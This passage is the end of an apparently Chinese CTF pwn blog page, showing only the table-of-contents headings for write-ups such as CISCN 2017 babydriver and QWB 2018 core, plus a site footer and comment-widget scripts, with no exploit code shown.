href="#%E6%80%9D%E8%B7%AF-10"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-9"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99dump%E8%84%9A%E6%9C%AC"><span class="toc-text">编写dump脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dump-%E6%96%87%E4%BB%B6%E8%84%9A%E6%9C%AC"><span class="toc-text">dump 文件脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90dump%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-text">IDA分析dump的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-libc-1"><span class="toc-text">leak libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9strlen%E7%9A%84got%E8%A1%A8%E5%86%85%E5%AE%B9%E4%B8%BAsystem"><span class="toc-text">修改strlen的got表内容为system</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell-2"><span class="toc-text">get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-9"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kenel-pwn-ciscn-2017-baby-driver"><span class="toc-text">Kenel pwn ciscn 2017 baby driver</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E9%A2%84%E5%A4%87"><span class="toc-text">知识预备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SLAB-amp-SLUB"><span class="toc-text">SLAB &amp; SLUB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-text">设备程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyopen%E5%87%BD%E6%95%B0"><span class="toc-text">babyopen函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babywrite%E5%87%BD%E6%95%B0"><span class="toc-text">babywrite函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyread-%E5%87%BD%E6%95%B0"><span class="toc-text">babyread 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyioctrl%E5%87%BD%E6%95%B0"><span class="toc-text">babyioctrl函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrelease%E5%87%BD%E6%95%B0"><span class="toc-text">babyrelease函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-11"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-10"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96vmlinux"><span class="toc-text">提取vmlinux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8gdb"><span class="toc-text">启动gdb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8boot-sh%E8%8E%B7%E5%8F%96babydriver%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9D%80"><span class="toc-text">启动boot.sh获取babydriver的加载基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-text">导入符号表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95qumu"><span class="toc-text">调试qumu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-1"><span class="toc-text">调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%AA%E6%B9%96%E6%9D%AF-2020"><span class="toc-text">太湖杯 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-11"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-core"><span class="toc-text">强网杯 2018 core</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E5%8E%8Bcpio%E6%96%87%E4%BB%B6"><span class="toc-text">如何解压cpio文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-7"><span class="toc-text">保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#start-script"><span class="toc-text">start script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#driver"><span class="toc-text">driver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-script"><span class="toc-text">init script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-text">程序逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-module%E5%87%BD%E6%95%B0"><span class="toc-text">init_module函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exit-core-%E5%87%BD%E6%95%B0"><span class="toc-text">exit_core 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-ioctl%E5%87%BD%E6%95%B0"><span class="toc-text">core_ioctl函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-read%E5%87%BD%E6%95%B0"><span class="toc-text">core_read函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-copy-func"><span class="toc-text">core_copy_func</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9-1"><span class="toc-text">漏洞点</span></a></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">1899 to 2022</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'LSe7mf1XYliLqgIrc3jlqXfT-gzGzoHsz'
 , appKey: 'Fu9giJfnidkCamaW89FUpidw' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>